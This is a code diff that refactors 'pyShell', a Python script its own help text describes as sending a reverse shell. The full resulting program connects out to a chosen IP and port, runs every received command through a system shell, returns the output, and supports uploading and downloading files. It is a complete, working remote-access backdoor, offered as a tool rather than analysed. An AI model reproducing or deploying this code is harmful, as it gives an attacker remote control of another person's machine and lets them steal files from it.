@@ -5,19 +5,6 @@
 
 import socket, time, subprocess, codecs, argparse
 
-
-#build help menu and arguments
-parser = argparse.ArgumentParser(description='Send a reverse shell. Use DOWNLOAD to initiate a download. Use UPLOAD to initiate an upload. Use QUIT to tear down the shell.')
-parser.add_argument('-t', dest='ip', help='provide ip to send a shell to, example: 127.0.0.1')
-parser.add_argument('-p', default='80', dest='port', help='declares which port to connect to.')
-parser.add_argument('-v', dest='version', required=False, action="store_true", help='Display the version number')
-args = parser.parse_args()
-
-#prints version
-if args.version:
-    print("pyShell version 0.2")
-    exit()
-
 def upload(mysocket):
     mysocket.send(b"What is the name of the file you want to upload?:")
     filename = mysocket.recv(1024).decode()
@@ -36,7 +23,6 @@ def upload(mysocket):
     else:
         mysocket.send(filename + b" successfully uploaded")
 
-
 def download(mysocket):
     mysocket.send(b"What file do you want (including path)?:")
     filename = mysocket.recv(1024).decode()
@@ -47,14 +33,13 @@ def download(mysocket):
         data = "File " + filename + " not found"
     mysocket.sendall(data + "!EOF!".encode())
 
-
-def Connect(ip, port):
+def connect(mySocket, ip, port):
     print("Initiating Connection")
     connected = False
     while not connected:
             try:
                 print("Trying", port, end=" ")
-                mysocket.connect((ip, int(port)))
+                mySocket.connect((ip, int(port)))
             except socket.error:
                 print("Connectivity issues")
                 exit
@@ -63,34 +48,53 @@ def Connect(ip, port):
                 connected = True
                 break
 
-if args.ip:
-    mysocket = socket.socket()
-    Connect(args.ip, args.port)
+def main():
+    # build help menu and arguments
+    parser = argparse.ArgumentParser(
+        description='Send a reverse shell. Use DOWNLOAD to initiate a download. Use UPLOAD to initiate an upload.'
+                    ' Use QUIT to tear down the shell.'
+                    '\nUSAGE: ./pyShell -t 127.0.0.1 -p 443')
+    parser.add_argument('-t', default='127.0.0.1', dest='ip', help='provide ip to send a shell to, example: 127.0.0.1')
+    parser.add_argument('-p', default='80', dest='port', help='declares which port to connect to.')
+    parser.add_argument('-v', dest='version', required=False, action="store_true", help='Display the version number')
+    args = parser.parse_args()
+    mySocket = socket.socket()
 
-while True:
-    try:
-        commandrequested = mysocket.recv(1024).decode()
-        if len(commandrequested) == 0:
-            time.sleep(3)
-            mysocket = socket.socket()
-            Connect()
-            continue
-        if commandrequested[:4] == "QUIT":
-            mysocket.send(b"Terminating Connection.")
-            break
-        if commandrequested[:6] == "UPLOAD":
-            upload(mysocket)
-            continue
-        if commandrequested[:8] == "DOWNLOAD":
-            download(mysocket)
-            continue
-        prochandle = subprocess.Popen(
-            commandrequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        results, errors = prochandle.communicate()
-        results = results + errors
-        mysocket.send(results)
-    except socket.error:
-        break
-    except Exception as e:
-        mysocket.send(bytes(str(e), "utf-8"))
-        break
+    if not args.ip and not args.version:
+        print(parser.description)
+    # prints version
+    if args.version:
+        print("pyShell version 0.2")
+        exit()
+    if args.ip and args.port:
+        connect(mySocket, args.ip, args.port)
+        while True:
+            try:
+                commandRequested = mySocket.recv(1024).decode()
+                if len(commandRequested) == 0:
+                    time.sleep(3)
+                    mySocket = socket.socket()
+                    connect(mySocket, args.ip, args.port)
+                    continue
+                if commandRequested[:4] == "QUIT":
+                    mySocket.send(b"Terminating Connection.\n")
+                    break
+                if commandRequested[:6] == "UPLOAD":
+                    upload(mySocket)
+                    continue
+                if commandRequested[:8] == "DOWNLOAD":
+                    download(mySocket)
+                    continue
+                prochandle = subprocess.Popen(
+                    commandRequested, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                results, errors = prochandle.communicate()
+                results = results + errors
+                mySocket.send(results)
+            except socket.error:
+                break
+            except Exception as e:
+                mySocket.send(bytes(str(e), "utf-8"))
+                break
+
+if __name__ == '__main__':
+    main()
